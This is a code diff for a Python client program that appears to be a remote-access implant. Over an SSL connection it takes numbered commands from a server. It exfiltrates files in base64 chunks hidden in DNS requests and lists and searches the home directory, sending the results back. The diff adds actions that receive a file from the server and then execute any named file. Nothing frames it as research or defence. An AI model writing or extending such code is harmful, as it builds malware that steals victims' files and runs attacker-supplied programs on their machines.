@@ -6,11 +6,13 @@ import socket
 import ssl
 import argparse
 import logging
+import subprocess
 from time import sleep
 from pathlib import Path
 from base64 import b64encode
 
 # Constants
+BUFFER_SIZE = 1024
 READ_BINARY = "rb"
 WRITE_BINARY = "wb"
 MAX_PAYLOAD_SIZE = 76
@@ -88,7 +90,7 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
     for chunk in chunks:
         dns_request = build_dns(host)
         chunk = b64encode(chunk).decode()
-        dns_request += (chunk + DATA_TERMINATOR.decode()).encode()
+        dns_request += (chunk + DATA_TERMINATOR).encode()
         s.sendto(dns_request, addr)
         sleep(time_delay)
 
@@ -98,6 +100,38 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
     s.sendto(dns_request, addr)
 
     return 0
+
+def receive_file(conn):
+    """
+    Receive file from server and save locally.
+    :param conn: Server connection socket
+    """
+    try:
+        save_path = conn.recv(BUFFER_SIZE).decode()
+        logging.info(f"Receiving file to save as: {save_path}")
+        dir_path = os.path.dirname(save_path)
+        if dir_path and not os.path.exists(dir_path):
+            os.makedirs(dir_path)
+        with open(save_path, 'wb') as f:
+            while True:
+                data = conn.recv(BUFFER_SIZE)
+                if data == b"!":
+                    break
+                f.write(data)
+        logging.info(f"File received and saved as {save_path}")
+    except Exception as e:
+        logging.error(f"Error receiving file: {e}")
+
+def execute_file(filename):
+    """
+    Execute a file on the client machine.
+    :param filename: Filename of the file to execute
+    """
+    try:
+        subprocess.run([filename], check=True)
+        logging.info(f"Executed file {filename}")
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Failed to execute file {filename}: {e}")
 
 def tree(dir_path: Path, prefix: str=''):
     """A recursive generator, given a directory Path object will yield a visual tree structure line by line."""
@@ -115,7 +149,11 @@ def tree(dir_path: Path, prefix: str=''):
                 extension = branch if pointer == tee else space
                 yield from tree(path, prefix=prefix+extension)
     except PermissionError:
-        pass
+        logging.error(f"Permission error for path: {dir_path}")
+    except FileNotFoundError:
+        logging.error(f"File not found: {dir_path}")
+    except OSError as e:
+        logging.error(f"OS error for path {dir_path}: {e}")
 
 def fileinfo(dir_path: Path, prefix: str=''):
     try:
@@ -125,7 +163,11 @@ def fileinfo(dir_path: Path, prefix: str=''):
             if path.is_dir():
                 yield from fileinfo(path, prefix=prefix)
     except PermissionError:
-        pass
+        logging.error(f"Permission error for path: {dir_path}")
+    except FileNotFoundError:
+        logging.error(f"File not found: {dir_path}")
+    except OSError as e:
+        logging.error(f"OS error for path {dir_path}: {e}")
 
 def main():
     if not is_admin():
@@ -168,6 +210,9 @@ def main():
                     except PermissionError:
                         logging.error(f"Permission error for path: {line}")
                         continue
+                    except OSError as e:
+                        logging.error(f"OS error for path {line}: {e}")
+                        continue
                 conn.sendall(b"!")
 
             elif action == 2:
@@ -201,7 +246,14 @@ def main():
                 logging.info(f"Searching for: {search_string}")
                 for path in fileinfo(Path.home()):
                     if search_string in str(path):
-                        conn.sendall((f"{path}\n").encode())
+                        try:
+                            conn.sendall((f"{path}\n").encode())
+                        except PermissionError:
+                            logging.error(f"Permission error for path: {path}")
+                            continue
+                        except OSError as e:
+                            logging.error(f"OS error for path {path}: {e}")
+                            continue
                 conn.sendall(b"!")
 
             elif action == 5:
@@ -211,6 +263,15 @@ def main():
                 conn.sendall(b"!")
 
             elif action == 6:
+                logging.info(f"Receiving file from server")
+                receive_file(conn)
+
+            elif action == 7:
+                filename = conn.recv(BUFFER_SIZE).decode()
+                logging.info(f"Executing file: {filename}")
+                execute_file(filename)
+
+            elif action == 8:
                 break
 
     except ssl.SSLError as e:
@@ -225,7 +286,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-endmessage = conn.recv(1024)
-print(endmessage.decode())
